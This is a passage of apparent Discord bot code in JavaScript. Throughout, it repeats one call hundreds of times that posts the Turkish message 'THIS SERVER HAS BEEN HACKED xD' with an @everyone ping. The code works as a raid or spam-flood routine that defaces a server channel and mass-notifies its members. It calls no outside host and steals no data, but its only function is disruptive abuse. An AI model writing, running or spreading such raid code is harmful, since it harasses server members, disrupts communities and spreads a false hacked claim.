        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
